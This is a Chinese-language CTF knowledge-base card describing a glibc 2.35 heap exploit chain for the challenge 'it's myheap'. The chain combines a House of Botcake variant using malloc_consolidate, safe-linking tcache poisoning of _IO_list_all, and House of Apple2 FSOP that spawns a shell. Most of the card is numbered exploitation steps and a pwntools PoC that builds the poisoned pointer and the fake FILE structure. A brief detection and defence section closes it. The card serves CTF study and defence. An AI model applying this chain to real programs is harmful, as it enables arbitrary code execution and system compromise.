---
id: binary-pwn-heap-glibc235-botcake-malloc-consolidate-io-list-all-apple2
title: glibc 2.35 House of Botcake 变体：0x20 间隔块用 malloc_consolidate 合并后再 unlink，tcache 毒化 _IO_list_all + House of Apple2
type: scenario
domain: binary
path: binary/pwn/heap
technique: glibc235-botcake-malloc-consolidate-io-list-all-apple2
tags:
- pwn
- heap
- glibc-2.35
- house-of-botcake
- tcache
- tcache-poisoning
- io-list-all
- house-of-apple2
- fsop
- safe-linking
- ctf
cve: []
severity: high
confidence: medium
affected_versions: glibc 2.35（原文标记 libc2.35）
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-V274
  verified_at: '2026-11-08T00:29:58+08:00'
  notes: 已对照原文 it's myheap 核对：0x20间隔块阻断unlink、add(15,0x500)触发malloc_consolidate把0x20与victim合并进smallbin、7+1填tcache后delete(8)入unsorted、mark-UAF改写8的meta、delete(7) unlink、add(10,0x80)腾槽后delete(8)使8同存tcache与unsorted、0xc0覆盖区毒化_IO_list_all^(chunk>>12)、0x80两次分配到_IO_list_all、0x410写fake FILE走_IO_wfile_jumps/House of Apple2 system("  sh;")均与exp及img06-10一致；dedup append_scenario所对比的2.39 apple2卡与2.31 botcake卡环境/构造不同，成立。未复跑。
url: /docs/binary/pwn/heap/binary-pwn-heap-glibc235-botcake-malloc-consolidate-io-list-all-apple2/
draft: false
kb_aliases:
- house of botcake 2.35
- 0x20 间隔块 unlink
- malloc_consolidate 合并 smallbin
- tcache 毒化 _IO_list_all
- house of apple2
- it's myheap
---

## 一句话结论

在 glibc 2.35 的 note 题里，House of Botcake 不能照搬 2.31：victim 与 prev 之间常夹着一个 0x20 元数据块，直接 `free(prev)` 无法触发向后合并/unlink；文档中的方法是先用一次大块（0x500）分配触发 `malloc_consolidate`，把这个 0x20 块与已释放的 victim 合并进 smallbin，再按“填满 tcache → victim 入 unsorted → free(prev) unlink 合并 → 腾槽 → 再次 free(victim)”的顺序，让同一个 0x90 chunk 同时出现在 unsorted bin 与 tcache 中；随后用 safe-linking 编码毒化 tcache fd 到 `_IO_list_all`，把全局 FILE 链表头改成堆上的 fake FILE，exit 时走 House of Apple2 调用 `system("  sh;")`。

## 原理

- **Botcake 的基本条件**：目标尺寸的 tcache 必须先填满 7 个，第一次 `free(victim)` 才不会进 tcache，而是进入 unsorted bin；随后 `free(prev)` 与 victim 向后合并，使 victim 的 `key` 被合并元数据覆盖；再从 tcache 取走一个块腾出槽位，第二次 `free(victim)` 时 key 检查通过、victim 重新进入 tcache，但它同时仍是 unsorted 合并块的一部分，形成“同一块内存两套视图”。之后用一次 overlapping 分配写 tcache entry，就能改写仍被视为 unsorted chunk 内部的 fd。
- **2.35 的额外困难**：本例的 note 由“0x20 元数据块 + 数据块”组成，victim 的数据块（8）前面紧挨着它自己的 0x20 元数据块。`free(7)` 时分配的 next chunk 是这块 0x20 meta，而不是已释放的 victim data8，导致向后合并/ unlink 被阻断。必须先让这块 0x20 meta 进入 fastbin，再用大请求触发 `malloc_consolidate`，把它与相邻的 free victim 合并成 smallbin 中的 0xb0 块（0x20 + 0x90），这样 `free(7)` 才能正常 unlink 并把 7、8 一起送入 unsorted bin。
- **为什么要 `malloc_consolidate`**：`_int_malloc` 在处理超出 smallbin 范围的大请求时会调用 `malloc_consolidate`，遍历 fastbin 并把相邻 free chunk 合并、按大小放入 unsorted/smallbin。原文用 `add(15, 0x500, 'a')` 触发它，注释明确“让 8 的 0x20 chunk 合并到 smallbin 中为了正常触发 unlink”。
- **mark 与 double free**：程序的 delete 只清 mark，不置空指针；首次 `delete(8)` 后 mark=0，无法再次 delete。原文通过 mark/指针分离的 UAF（见关联卡）把 8 的 meta 重写成 `[0x80, 1, ...]`，使 8 可以被再次 free。第二次 `free(8)` 前还要先 `add(10, 0x80)` 从 tcache 取走一个块，否则 tcache 满会让 8 进入 unsorted，触发 `double free or corruption (!prev)`。
- **tcache 毒化到 `_IO_list_all`**：8 同时在 tcache 与 unsorted 中后，用一次 0xc0 分配覆盖合并区，重建 victim 的 0x91 size 与 fd：`fd = _IO_list_all ^ (chunk>>12)`（safe-linking）。随后两次 0x80 分配：第一次返回 victim，第二次返回 `_IO_list_all`，把链表头写成堆上 fake FILE 的地址。
- **House of Apple2 为什么成立**：`exit()` → `_IO_cleanup` → `_IO_flush_all_lockp` 遍历 `_IO_list_all`；fake FILE 满足 `_mode <= 0` 且 `_IO_write_ptr > _IO_write_base` 后调用 `_IO_OVERFLOW`。主 vtable 填合法的 `_IO_wfile_jumps` 通过 `IO_validate_vtable`（该校验只覆盖主 vtable，不覆盖 `_wide_data->_wide_vtable`）；`_wide_data->_IO_write_base` 为 NULL 时进入 `_IO_wdoallocbuf`，其 `*(_wide_vtable + 0x68)(fp)` 槽被写成 `system`，`_flags` 放 `"  sh;"` 既避开 `_IO_NO_WRITES`/`_IO_UNBUFFERED` 等标志又等价于 `system("sh")`。

## 触发条件

- x86-64 Linux，glibc 2.35（tcache key + safe-linking 生效）；Full RELRO/PIE 均可，原文为 no PIE/Partial RELRO。
- note 管理器存在 mark/指针分离的 UAF，能对已释放 chunk 重新置 mark 并再次 free。
- 能申请到 victim 尺寸的 7 个 chunk 填满 tcache，且能申请大块（如 0x500）触发 `malloc_consolidate`。
- victim 与 prev 之间存在已释放的小元数据块，且该块可以被合并进 smallbin。
- 已知 heap 与 libc 基址（largebin/unsorted 或 show 泄露）、`_IO_list_all`/`_IO_wfile_jumps`/`system` 偏移，以及 fake FILE/`_IO_wide_data` 的版本布局。

## 利用步骤

1. 先泄露 libc 与 heap（原文 gift 打 puts 得 libc；largebin 布局 show 得 heap）。选 0x90 作为 victim 尺寸。
2. 申请 7 个 0x80 note 填满 tcache；再申请 victim `add(7,0x80)`、相邻块 `add(8,0x80)`、guard `add(9,0x18)`。
3. `delete(0..6)` 填满 tcache；`delete(8)` 使 victim 数据块进入 unsorted bin（meta 进入 fastbin）。
4. 用 mark-UAF 将 8 的元数据改写为 `size=0x80, mark=1, pointer=...`，使 8 可以被再次 delete；同时通过 0x18 的 add/delete 把夹在 7 与 8 之间的 0x20 meta 释放进 fastbin。
5. `add(15, 0x500, 'a')` 触发 `malloc_consolidate`：0x20 meta 与已释放的 victim 合并为 0xb0 smallbin 块，移走 unlink 障碍。
6. `delete(7)`：7 与这块 smallbin 合并/ unlink，7、8 一起进入 unsorted bin。
7. `add(10, 0x80)` 从 tcache 取走一个块腾出槽位；`delete(8)` 再次 free，8 同时存在于 tcache 与 unsorted 合并块中。
8. 用 `add(11, 0xc0, b'a'*0xa0 + p64(0) + p64(0x91) + p64(io_list_all ^ (chunk>>12)))` 覆盖合并区里 victim 的头部并毒化 fd。
9. 连续两次 0x80 分配：第一次返回 victim，第二次返回 `_IO_list_all`；在后者写入 fake FILE 的堆地址。
10. 用 0x410 分配把 fake FILE 写到该堆地址：`_flags="  sh;"`、`_mode=0`、`_IO_write_base=0`、`_IO_write_ptr=1`、`vtable=_IO_wfile_jumps`、`_wide_data` 指向堆上 fake wide_data，并在 `wide_vtable+0x68` 写 `system`。
11. 选择退出菜单，触发 `exit()` 的 FSOP，执行 `system("  sh;")` 拿 shell。

## PoC

原文 it's myheap 的关键段（地址/偏移为该题布局，`io_list_all`、`system_addr` 由 libc 基址计算）：

```python
# 0x90 tcache 填满，victim=7, 8 相邻，9 为 guard
for i in range(7):
    add(i, 0x80, 'a')
add(7, 0x80, 'a'); add(8, 0x80, 'a'); add(9, 0x18, 'a')
for i in range(7):
    delete(i)
delete(8)

# mark-UAF: 改写 8 的 meta，并让 0x20 meta 进入 fastbin
add(15, 0x18, 'a'); add(14, 0x18, 'a')
add(13, 0x18, 'a'); add(12, 0x18, p64(0x80) + p64(1) + p64(heapbase + 0xcd0))
delete(15); delete(14); delete(13); delete(12)

# malloc_consolidate: 0x20 blocker + victim -> smallbin，再 free(7) unlink
add(15, 0x500, 'a')
delete(7)
add(10, 0x80, 'a')      # 腾出 tcache 槽位，避免 (!prev)
delete(8)               # 8 同时在 unsorted 与 tcache

# tcache poison 到 _IO_list_all
payload = b'a'*0xa0 + p64(0) + p64(0x91) + p64(io_list_all ^ ((heapbase + 0xcc0) >> 12))
add(11, 0xc0, payload)
add(0, 0x80, b'a')
add(1, 0x80, p64(heapbase + 0x12b0))          # _IO_list_all -> fake FILE

# House of Apple2 fake FILE
ioaddr = heapbase + 0x12b0
payload = b'  sh;\x00\x00\x00' + p64(0) + p64(0)*2 + p64(1) + p64(2)
payload = payload.ljust(0xa0, b'\x00') + p64(ioaddr + 0xe0)          # _wide_data
payload = payload.ljust(0xd8, b'\x00') + p64(libcbase + libc.sym['_IO_wfile_jumps'])
payload = payload.ljust(0xe0 + 0xe0, b'\x00') + p64(ioaddr + 0xe0 + 0xe8)
payload = payload.ljust(0xe0 + 0xe8 + 0x68, b'\x00') + p64(libcbase + libc.sym['system'])
add(2, 0x410, payload)

p.sendlineafter(">>> ", str(4))   # exit -> FSOP
```

> 说明：该 PoC 为原文 exp 的关键裁剪，堆偏移（0xcc0/0x12b0 等）针对原题布局；`_IO_FILE`/`_IO_wide_data` 字段偏移需按目标 libc 核对。原文未附运行回显，卡片置信度 medium，未在本机复跑。

## 变体与关联

- **无 0x20 间隔块**：可直接使用标准 House of Botcake；2.31 无 safe-linking 的版本见 [[binary-pwn-heap-house-of-botcake-tcache-poison]]（该卡目标为 stdout，且无需处理 2.35 的 key/safe-linking）。
- **同一 sink 的其他打法**：[[binary-pwn-heap-tcache-poison-io-list-all-house-of-apple2]] 在 glibc 2.39 用堆溢出/UAF 直接把 `_IO_list_all` 改成堆 fake FILE；本卡用 2.35 botcake + `malloc_consolidate` 处理 unlink 障碍，环境与堆构造明显不同。
- **直接覆盖 stderr 的 apple2**：[[binary-pwn-heap-house-of-apple-2-stderr-fsop]] 不需要改 `_IO_list_all`，但在本链里 tcache 毒化目标已指向 `_IO_list_all`，两者可互换。
- **前置原语**：[[binary-pwn-heap-mark-pointer-split-metadata-uaf-arbitrary-read-free]]（mark/指针分离、任意读与任意 free）；safe-linking 编码见 [[binary-pwn-heap-safe-linking-self-xor-heap-address]]。
- 边界：tcache 尺寸上限（0x410）、tcache key/safe-linking、`malloc_consolidate` 触发条件与 `_IO_wfile_jumps` 布局随版本变化；没有 mark-UAF 或无法再次 free victim 时本链不成立。

## 检测与防御

- 修复：delete 时置空指针与 mark；元数据块不可与用户数据同 size class 复用；free 前校验对象生命周期。
- 加固：升级 glibc 并跟进 FSOP 校验；对 `_IO_list_all` 指向堆、`_wide_data`/`_wide_vtable` 指向堆做异常检测；启用 tcache/fastbin 完整性检查。
- 检测：同一 chunk 同时出现在 tcache 与 unsorted bin；`malloc_consolidate`/`unlink` 阶段的 `corrupted size`/`double free` 报错；`_IO_FILE._flags` 出现 `"  sh;"`、vtable 为 `_IO_wfile_jumps` 但 `_wide_data` 指向堆；退出阶段 `_IO_wdoallocbuf` 调用到 `system`。
- 该场景为 CTF/授权测试利用；生产环境不能依赖“只有一个对象”或“mark 已清”作为安全释放条件。
